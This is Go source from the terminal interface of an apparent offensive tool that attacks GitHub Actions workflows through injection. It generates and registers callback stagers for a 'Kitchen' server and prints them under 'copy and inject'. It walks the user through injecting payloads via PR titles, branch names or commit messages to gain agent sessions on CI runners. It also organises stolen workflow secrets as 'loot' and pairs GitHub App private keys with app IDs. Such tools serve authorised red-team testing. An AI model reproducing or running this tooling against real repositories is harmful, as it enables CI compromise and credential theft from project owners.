	case "":
		m.AddOutput("success", fmt.Sprintf("Target set: %s (%s)", m.target, m.targetType))
	case spec:
		m.AddOutput("info", fmt.Sprintf("Target unchanged: %s (%s)", m.target, m.targetType))
	default:
		m.AddOutput("success", fmt.Sprintf("Target changed: %s → %s", prevSpec, spec))
	}

	logLine := "Target → " + spec
	if origin != "" && origin != "command" {
		logLine += " (" + origin + ")"
	}
	m.activityLog.Add(IconInfo, logLine)
	m.flashMessage = "Target → " + spec
	m.flashUntil = time.Now().Add(2 * time.Second)

	cfg, err := counter.LoadConfig()
	if err != nil || cfg == nil {
		cfg = &counter.Config{}
	}
	cfg.Target = spec
	if err := counter.SaveConfig(cfg); err != nil {
		m.AddOutput("warning", fmt.Sprintf("Could not save config: %v", err))
	} else {
		m.AddOutput("info", "Target saved to config")
	}
}

func (m Model) handlePayloadCommand(contextName string) (tea.Model, tea.Cmd) {
	if m.config.KitchenURL == "" {
		m.AddOutput("error", "Kitchen URL not set. Use 'set kitchen <url>' first.")
		return m, nil
	}

	if contextName == "" {
		if m.selectedVuln >= 0 && m.selectedVuln < len(m.vulnerabilities) {
			v := m.vulnerabilities[m.selectedVuln]
			injCtx, ok := payloadInjectionContextForVuln(&v)
			if !ok {
				if reason := exploitSupportBlockReason(&v); reason != "" {
					m.AddOutput("error", reason)
				} else {
					m.AddOutput("error", fmt.Sprintf("No payload context available for %s", v.ID))
				}
				return m, nil
			}
			contextName = injCtx.Name
			m.AddOutput("info", fmt.Sprintf("Using selected vulnerability: %s (%s)", v.ID, contextName))
		} else {
			m.AddOutput("error", "No context specified and no vulnerability selected.")
			m.AddOutput("info", "Usage: payload <context>")
			m.AddOutput("info", "Contexts: pr_title, pr_body, github_script, git_branch, commit_message")
			m.AddOutput("info", "Or use 'vulns' to list findings, then 'use <id>' to select one")
			return m, nil
		}
	}

	if m.lightRye == nil {
		m.lightRye = rye.NewLightRye(m.config.ExternalURL())
	}

	payload, err := m.lightRye.QuickStager(contextName)
	if err != nil {
		m.AddOutput("error", fmt.Sprintf("Failed to generate payload: %v", err))
		m.AddOutput("info", "Valid contexts: pr_title, pr_body, github_script, git_branch, commit_message, bash_run, bash_unquoted, bash_single_quoted, bash_double_quoted, bash_heredoc_unquoted")
		return m, nil
	}

	m.AddOutput("info", "Registering stager with Kitchen...")
	stagerID, ok := stagerurl.IDFromPath(payload.KitchenPath)
	if !ok {
		m.AddOutput("warning", "Generated stager path could not be parsed for registration")
		m.AddOutput("info", "Payload will still work if Kitchen is running")
	} else if err := m.registerStager(stagerID); err != nil {
		m.AddOutput("warning", fmt.Sprintf("Stager registration failed: %v", err))
		m.AddOutput("info", "Payload will still work if Kitchen is running")
	} else {
		m.AddOutput("success", "Stager registered: "+stagerID)
	}

	m.AddOutput("info", "")
	m.AddOutput("info", "════════════════════════════════════════════════════════════════")
	m.AddOutput("success", " PAYLOAD (copy and inject):")
	m.AddOutput("info", "════════════════════════════════════════════════════════════════")
	m.AddOutput("info", "")
	m.AddOutput("output", payload.Raw)
	m.AddOutput("info", "")
	m.AddOutput("info", "════════════════════════════════════════════════════════════════")
	m.AddOutput("info", "")
	m.AddOutput("info", fmt.Sprintf("Context:  %s", payload.Context))
	m.AddOutput("info", fmt.Sprintf("Callback: %s", payload.CallbackURL))
	m.AddOutput("info", fmt.Sprintf("Technique: %s", payload.Technique))
	m.AddOutput("info", "")

	m.showPayloadNextSteps(contextName)

	return m, nil
}

func (m *Model) showPayloadNextSteps(contextName string) {
	m.AddOutput("info", "Next steps:")
	switch contextName {
	case "pr_title":
		m.AddOutput("info", "  1. Create a PR with the payload as the title")
		m.AddOutput("info", "  2. Target workflow will execute on PR open/sync")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	case "pr_body":
		m.AddOutput("info", "  1. Create a PR with the payload in the body")
		m.AddOutput("info", "  2. Target workflow will execute on PR open/sync")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	case "github_script":
		m.AddOutput("info", "  1. Inject payload into context used by github-script action")
		m.AddOutput("info", "  2. Works in both single and double quote contexts")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	case "git_branch":
		m.AddOutput("info", "  1. Create a branch with the payload as the name")
		m.AddOutput("info", "  2. Push the branch to trigger workflow")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	case "commit_message":
		m.AddOutput("info", "  1. Create a commit with the payload in the message")
		m.AddOutput("info", "  2. Push to trigger workflow")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	default:
		m.AddOutput("info", "  1. Inject payload into vulnerable context")
		m.AddOutput("info", "  2. Trigger the workflow")
		m.AddOutput("info", "  3. Agent will appear in sessions panel")
	}
	m.AddOutput("info", "")
}

func (m *Model) showVulnerabilities() {
	if len(m.vulnerabilities) == 0 {
		m.AddOutput("warning", "No vulnerabilities found yet.")
		m.AddOutput("info", "Run 'analyze' to find vulnerabilities, or use 'payload <context>' directly.")
		return
	}

	m.AddOutput("info", "")
	m.AddOutput("info", "Found Vulnerabilities:")
	for i, v := range m.vulnerabilities {
		selected := ""
		if i == m.selectedVuln {
			selected = " [SELECTED]"
		}
		severity := v.Severity
		if severity == "" {
			severity = "unknown"
		}

		m.AddOutput("info", "")
		m.AddOutput("warning", fmt.Sprintf("[%s] %s (%s)%s", v.ID, v.Repository, severity, selected))
		m.AddOutput("info", fmt.Sprintf("  Workflow: %s:%d", v.Workflow, v.Line))
		m.AddOutput("info", fmt.Sprintf("  Context:  %s | Trigger: %s", v.Context, v.Trigger))
		if v.Expression != "" {
			m.AddOutput("info", fmt.Sprintf("  Expr:     %s", v.Expression))
		}
	}
	m.AddOutput("info", "")
	m.AddOutput("info", "Use 'use <id>' to select a vulnerability, then 'payload' to generate.")
}

func (m *Model) showLightRyeMenu() {
	if m.config.KitchenURL == "" {
		m.AddOutput("error", "Kitchen URL not set. Use 'set kitchen <url>' first.")
		return
	}

	if m.lightRye == nil {
		m.lightRye = rye.NewLightRye(m.config.ExternalURL())
	}

	menu := m.lightRye.Menu()

	m.AddOutput("info", "")
	m.AddOutput("info", "Light Rye Injection Payloads:")
	m.AddOutput("info", "════════════════════════════════════════════════════════════════")

	for _, item := range menu {
		m.AddOutput("info", "")
		m.AddOutput("success", fmt.Sprintf("[%s] %s", item.ID, item.Name))
		m.AddOutput("info", fmt.Sprintf("  %s", item.Description))
		m.AddOutput("info", fmt.Sprintf("  Constraints: %s", strings.Join(item.Constraints, ", ")))
		m.AddOutput("info", fmt.Sprintf("  Preview: %s", item.Preview))
	}

	m.AddOutput("info", "")
	m.AddOutput("info", "════════════════════════════════════════════════════════════════")
	m.AddOutput("info", "Use 'payload <context>' to generate a payload")
	m.AddOutput("info", "Example: payload github_script")
	m.AddOutput("info", "")
}

func (m *Model) selectVulnerability(vulnID string) {
	index, err := m.findVulnerabilityIndex(vulnID)
	if err != nil {
		m.AddOutput("error", err.Error())
		m.AddOutput("info", "Use 'vulns' to list available vulnerabilities")
		return
	}
	m.applySelectedVulnerability(index)
	v := m.vulnerabilities[index]
	m.AddOutput("success", fmt.Sprintf("Selected: %s", v.ID))
	m.AddOutput("info", fmt.Sprintf("  Repository: %s", v.Repository))
	m.AddOutput("info", fmt.Sprintf("  Workflow: %s:%d", v.Workflow, v.Line))
	m.AddOutput("info", fmt.Sprintf("  Context: %s", v.Context))
	m.AddOutput("info", "")
	m.AddOutput("info", "Use 'payload' to generate injection payload for this vulnerability.")
}

func (m *Model) applySelectedVulnerability(index int) bool {
	if index < 0 || index >= len(m.vulnerabilities) {
		return false
	}
	m.selectedVuln = index
	m.focusPane(PaneFocusFindings)
	return m.TreeSelectByID(m.vulnerabilities[index].ID)
}

func (m *Model) selectedVulnerabilityIndex() int {
	node := m.SelectedTreeNode()
	if index := m.vulnerabilityIndexForNode(node); index >= 0 {
		return index
	}
	if m.selectedVuln >= 0 && m.selectedVuln < len(m.vulnerabilities) {
		return m.selectedVuln
	}
	return -1
}

func (m *Model) openSelectedVulnerabilityWizard(query string) (tea.Cmd, error) {
	var index int
	if strings.TrimSpace(query) == "" {
		index = m.selectedVulnerabilityIndex()
		if index < 0 {
			return nil, fmt.Errorf("no vulnerability selected")
		}
	} else {
		var err error
		index, err = m.findVulnerabilityIndex(query)
		if err != nil {
			target, dispatchErr := m.workflowDispatchTargetForQuery(query)
			if dispatchErr == nil {
				if openErr := m.OpenWorkflowDispatchWizard(target); openErr != nil {
					return nil, openErr
				}
				return nil, nil
			}
			return nil, err
		}
	}
	m.applySelectedVulnerability(index)
	if err := m.OpenWizard(&m.vulnerabilities[index]); err != nil {
		return nil, err
	}
	return m.startWizardPreflight(false), nil
}

func (m *Model) findVulnerabilityIndex(query string) (int, error) {
	query = strings.TrimSpace(query)
	if query == "" {
		return -1, fmt.Errorf("vulnerability not found: %s", query)
	}

	upperQuery := strings.ToUpper(query)
	idMatches := make([]int, 0, len(m.vulnerabilities))
	for i, v := range m.vulnerabilities {
		if v.ID == upperQuery {
			return i, nil
		}
		if strings.HasPrefix(v.ID, upperQuery) {
			idMatches = append(idMatches, i)
		}
	}
	if len(idMatches) == 1 {
		return idMatches[0], nil
	}
	if len(idMatches) > 1 {
		return -1, fmt.Errorf("ambiguous vulnerability: %s", query)
	}

	tokens := strings.Fields(strings.ToLower(query))
	matches := make([]int, 0, len(m.vulnerabilities))
	for i, v := range m.vulnerabilities {
		searchText := strings.ToLower(strings.Join([]string{
			v.ID,
			v.Title,
			v.RuleID,
			v.Context,
			v.Trigger,
			v.Repository,
			v.Workflow,
			v.Job,
		}, " "))
		allMatched := true
		for _, token := range tokens {
			if !strings.Contains(searchText, token) {
				allMatched = false
				break
			}
		}
		if allMatched {
			matches = append(matches, i)
		}
	}
	if len(matches) == 1 {
		return matches[0], nil
	}
	if len(matches) == 0 {
		return -1, fmt.Errorf("vulnerability not found: %s", query)
	}
	return -1, fmt.Errorf("ambiguous vulnerability: %s", query)
}

func (m *Model) reclassifyLootTypes() {
	for i, s := range m.lootStash {
		if st, ok := m.workflowSecretTypes[s.Name]; ok && m.lootStash[i].Type != st {
			m.lootStash[i].Type = st
			m.lootStashDirty = true
		}
	}
	for i, s := range m.sessionLoot {
		if st, ok := m.workflowSecretTypes[s.Name]; ok && m.sessionLoot[i].Type != st {
			m.sessionLoot[i].Type = st
		}
	}
}

func (m *Model) pairGitHubAppCredentials() {
	var pemName, appIDName, appIDValue string

	for _, s := range m.lootStash {
		if s.PairedAppID != "" {
			return
		}
		switch s.Type {
		case "github_app_key":
			if pemName == "" {
				pemName = s.Name
			}
		case "github_app_id":
			if appIDName == "" {
				appIDName = s.Name
				appIDValue = strings.TrimSpace(s.Value)
			}
		}
	}
	for _, s := range m.sessionLoot {
		if s.PairedAppID != "" {
			return
		}
		switch s.Type {
		case "github_app_key":
			if pemName == "" {
				pemName = s.Name
			}
		case "github_app_id":
			if appIDName == "" {
				appIDName = s.Name
				appIDValue = strings.TrimSpace(s.Value)
			}
		}
	}

	if pemName != "" && appIDValue == "" && len(m.hardcodedAppIDs) > 0 {
		appIDValue = m.hardcodedAppIDs[0]
	}

	if pemName == "" || appIDValue == "" {
		return
	}

	pemIdx := m.FindLootIndex(pemName)
	if pemIdx < 0 {
		for i, s := range m.sessionLoot {
			if s.Name == pemName {
				m.sessionLoot[i].PairedAppID = appIDValue
				break
			}
		}
	} else {
		m.lootStash[pemIdx].PairedAppID = appIDValue
	}

	if appIDName != "" {
		appIDIdx := m.FindLootIndex(appIDName)
		if appIDIdx >= 0 {
			m.lootStash = append(m.lootStash[:appIDIdx], m.lootStash[appIDIdx+1:]...)
		} else {
			for i, s := range m.sessionLoot {
				if s.Name == appIDName {
					m.sessionLoot = append(m.sessionLoot[:i], m.sessionLoot[i+1:]...)
					break
				}
			}
		}
	}
	m.lootStashDirty = true
}

func (m *Model) updateSessionContext(agentID, repo, workflow, job string) {
	if agentID == "" {
		return
	}
	for i := range m.sessions {
		if m.sessions[i].AgentID != agentID {
			continue
		}
		if repo != "" {
			m.sessions[i].Repo = repo
		}
		if workflow != "" {
			m.sessions[i].Workflow = workflow
		}
		if job != "" {
			m.sessions[i].Job = job
		}
		return
	}
}

func (m *Model) clearSessionContext(agentID string) {
	if agentID == "" {
		return
	}
	for i := range m.sessions {
		if m.sessions[i].AgentID != agentID {
			continue
		}
		m.sessions[i].Repo = ""
		m.sessions[i].Workflow = ""
		m.sessions[i].Job = ""
		return
	}
}

func (m Model) sessionContext(agentID string) (repo, workflow, job string) {
	if agentID == "" {
		return "", "", ""
	}
	for _, session := range m.sessions {
		if session.AgentID != agentID {
			continue
		}
		return session.Repo, session.Workflow, session.Job
	}
	return "", "", ""
}
